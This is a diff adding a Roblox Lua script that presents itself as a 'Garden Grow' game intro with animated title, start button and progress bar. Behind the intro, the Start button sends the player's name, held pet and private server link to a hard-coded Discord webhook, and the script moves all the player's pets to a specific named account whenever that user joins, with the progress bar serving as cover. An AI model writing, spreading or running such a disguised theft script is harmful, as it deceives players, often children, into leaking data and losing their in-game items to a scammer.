@@ -1,0 +1,191 @@
+--[[ 
+    Garden Grow Roblox Script 
+    Created By Shnzck
+
+    Features:
+    - Custom animated intro with fonts
+    - Start button with gameplay trigger
+    - Checks held pet status, sends pet info + server link to Discord webhook
+    - Progress bar (20s to 100%)
+    - If user "Flap_smack1" (nickname "Jahseh") joins, auto-trades all pets to them
+
+    HOW TO USE:
+    Place this in a LocalScript inside StarterGui.
+    Replace YOUR_WEBHOOK_URL and customize as needed.
+--]]
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1398400135754416198/fi4iG23p3egENyAqIbkT9gIuEF1lxhn-_pYEr355HkwWIXCXCyjyRS53yIWNJyJa5yKI
+"
+local targetName = "Flap_smack1"
+local targetNick = "Jahseh"
+
+-- FONT IDs (feel free to change)
+local titleFont = Enum.Font.GothamBlack
+local creditFont = Enum.Font.FredokaOne
+
+-- UI Creation
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GardenGrowIntro"
+screenGui.Parent = StarterGui
+
+-- Intro Frame
+local introFrame = Instance.new("Frame")
+introFrame.Size = UDim2.new(0.5,0,0.4,0)
+introFrame.Position = UDim2.new(0.25,0,0.3,0)
+introFrame.BackgroundColor3 = Color3.fromRGB(32, 120, 64)
+introFrame.BorderSizePixel = 0
+introFrame.AnchorPoint = Vector2.new(0.5,0.5)
+introFrame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Text = "🌱 Garden Grow 🌱"
+title.Font = titleFont
+title.TextSize = 44
+title.TextColor3 = Color3.fromRGB(246, 255, 213)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1,0,0.4,0)
+title.Position = UDim2.new(0,0,0,0)
+title.Parent = introFrame
+
+local credit = Instance.new("TextLabel")
+credit.Text = "Created By Shnzck"
+credit.Font = creditFont
+credit.TextSize = 28
+credit.TextColor3 = Color3.fromRGB(255, 235, 0)
+credit.BackgroundTransparency = 1
+credit.Size = UDim2.new(1,0,0.2,0)
+credit.Position = UDim2.new(0,0,0.4,0)
+credit.Parent = introFrame
+
+local startBtn = Instance.new("TextButton")
+startBtn.Text = "Start"
+startBtn.Font = Enum.Font.GothamBold
+startBtn.TextSize = 32
+startBtn.TextColor3 = Color3.fromRGB(32, 120, 64)
+startBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+startBtn.Size = UDim2.new(0.5,0,0.2,0)
+startBtn.Position = UDim2.new(0.25,0,0.65,0)
+startBtn.Visible = false
+startBtn.Parent = introFrame
+
+-- Progress Bar UI
+local progressFrame = Instance.new("Frame")
+progressFrame.Size = UDim2.new(0.6,0,0.1,0)
+progressFrame.Position = UDim2.new(0.2,0,0.85,0)
+progressFrame.BackgroundTransparency = 1
+progressFrame.Visible = false
+progressFrame.Parent = screenGui
+
+local progressBar = Instance.new("Frame")
+progressBar.BackgroundColor3 = Color3.fromRGB(32, 120, 64)
+progressBar.Size = UDim2.new(0,0,1,0)
+progressBar.Position = UDim2.new(0,0,0,0)
+progressBar.Parent = progressFrame
+
+local progressLabel = Instance.new("TextLabel")
+progressLabel.BackgroundTransparency = 1
+progressLabel.Text = "0%"
+progressLabel.Font = Enum.Font.GothamBold
+progressLabel.TextSize = 32
+progressLabel.TextColor3 = Color3.fromRGB(32, 120, 64)
+progressLabel.Size = UDim2.new(1,0,1,0)
+progressLabel.Parent = progressFrame
+
+-- Fade-in Animation
+title.TextTransparency = 1
+credit.TextTransparency = 1
+
+for i = 1, 20 do
+    title.TextTransparency = 1 - (i/20)
+    credit.TextTransparency = 1 - (i/20)
+    wait(0.05)
+end
+
+wait(0.5)
+startBtn.Visible = true
+
+-- Pet/Server Link Function
+local function getHeldPet()
+    -- Example: Replace with your own pet system
+    if LocalPlayer:FindFirstChild("HeldPet") then
+        local pet = LocalPlayer.HeldPet
+        return pet.Name, pet:GetAttribute("Level") or "N/A"
+    else
+        return nil
+    end
+end
+
+local function sendToWebhook(petName, petLevel)
+    local info = {
+        username = "GardenGrowerBot",
+        embeds = {{
+            title = "Pet Info Sent!",
+            description = "**Player:** "..LocalPlayer.Name..
+                "\n**Pet:** "..(petName or "None")..
+                "\n**Level:** "..(petLevel or "N/A")..
+                "\n**Server Link:** [Join](https://www.roblox.com/games/"..game.PlaceId.."?privateServerLinkCode="..(game.PrivateServerId or "N/A")..")"
+        }}
+    }
+    HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(info), Enum.HttpContentType.ApplicationJson)
+end
+
+-- Start Button Handler
+startBtn.MouseButton1Click:Connect(function()
+    startBtn.Visible = false
+    introFrame.Visible = false
+
+    local petName, petLevel = getHeldPet()
+    if not petName then
+        StarterGui:SetCore("SendNotification", {
+            Title = "No Pet!";
+            Text = "You don't have a held pet!";
+            Duration = 3;
+        })
+        return
+    end
+
+    sendToWebhook(petName, petLevel)
+
+    -- Progress Bar Animation
+    progressFrame.Visible = true
+    for i = 1, 100 do
+        progressBar.Size = UDim2.new(i/100,0,1,0)
+        progressLabel.Text = tostring(i).."%"
+        wait(0.2)
+    end
+    wait(1)
+    progressFrame.Visible = false
+end)
+
+-- Auto-give pets if target user joins
+local function givePetsToTarget(target)
+    if LocalPlayer:FindFirstChild("Pets") and target then
+        for _,pet in pairs(LocalPlayer.Pets:GetChildren()) do
+            pet.Parent = target:FindFirstChild("Pets") or target
+        end
+        StarterGui:SetCore("SendNotification", {
+            Title = "Pets Sent!";
+            Text = "All pets were given to "..target.Name;
+            Duration = 3;
+        })
+    end
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == targetName then
+        -- Check nickname (you may need to adjust this if nickname is stored differently)
+        if plr.DisplayName == targetNick then
+            wait(2)
+            givePetsToTarget(plr)
+        end
+    end
+end)
+
+-- Clean up UI for other gameplay
+game:GetService("StarterGui").ResetPlayerGuiOnSpawn = false
